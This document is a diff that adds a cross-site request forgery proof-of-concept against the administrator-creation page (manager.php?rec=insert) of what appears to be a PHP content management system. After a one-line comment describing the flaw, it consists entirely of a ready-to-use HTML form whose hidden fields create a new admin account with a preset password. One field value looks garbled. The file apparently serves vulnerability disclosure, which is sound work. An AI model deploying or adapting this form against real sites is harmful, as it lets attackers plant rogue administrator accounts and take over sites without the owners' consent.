@@ -1,0 +1,17 @@
+
+#There is a csrf vulnerability in the place where the administrator is added to add an administrator
+<html>
+  
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.138.142/dphp/upload/admin/manager.php?rec=insert" method="POST">
+      <input type="hidden" name="user&#95;name" value="test" />
+      <input type="hidden" name="email" value="ad&#64;qq&#46;com" />
+      <input type="hidden" name="password" value="admin123" />
+      <input type="hidden" name="password&#95;confirm" value="admin123" />
+      <input type="hidden" name="token" value="f5f38177" />
+      <input type="hidden" name="submit" value="?&#143;&#144;?o&#164;" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
